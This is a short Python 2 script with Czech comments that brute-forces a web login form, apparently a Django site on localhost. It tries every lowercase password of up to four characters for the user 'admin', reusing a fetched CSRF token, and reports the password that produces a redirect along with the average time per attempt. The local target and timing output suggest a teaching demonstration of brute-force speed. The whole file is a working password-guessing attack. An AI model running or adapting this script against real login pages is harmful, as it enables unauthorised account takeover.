# -*- coding: utf-8 -*-

import itertools
import time
import sys
import requests

"""
priklad

a
z
aa
ab
ac
zz
aaa
dfg
zzz
aaaa
zzzz
"""
adresa = 'http://localhost:8000/'
passwords = []
max_delka_hesla = 4
delka_jednotlivych_pokusu = []

for delka_hesla in range(1, max_delka_hesla + 1):
    passwords.append(list(itertools.product('abcdefghijklmnopqrstuvwxyz', repeat=delka_hesla)))
    # print len(passwords[repeat-1])

# odesilame hesla o delce 1

def zkus_heslo(heslo):
    heslo = ''.join(heslo)
    pred = time.time()
    zkus_na_strance(heslo)
    po = time.time()
    delka_jednotlivych_pokusu.append(po - pred)


def zkus_na_strance(heslo):
    post_odpoved = requests.post(adresa, data={'username': 'admin', 'password': heslo, 'csrfmiddlewaretoken': csrf},
                                 cookies=dict(csrftoken=csrf), allow_redirects=False)
    if post_odpoved.is_redirect:
        # jsme presmerovani a heslo je ok
        print 'Heslo je %s' % heslo
        print 'Jeden pokus trval prumerne', sum(delka_jednotlivych_pokusu) / len(delka_jednotlivych_pokusu), 's'
        sys.exit()

# ulozime si csrf pro dalsi pouziti at nemusime volat GET dokola
session = requests.Session()
uvodni_pozadavek = session.get(adresa)
csrf = uvodni_pozadavek.cookies['csrftoken']

for delka_hesla in range(0, max_delka_hesla):
    pred = time.time()
    for heslo in passwords[delka_hesla]:
        zkus_heslo(heslo)
    po = time.time()
    print "zkouseni %s hesel o delce" % len(passwords[delka_hesla]), delka_hesla + 1, "trvalo %.3f" % (po - pred), 's'

print 'Jeden pokus trval prumerne', sum(delka_jednotlivych_pokusu) / len(delka_jednotlivych_pokusu), 's'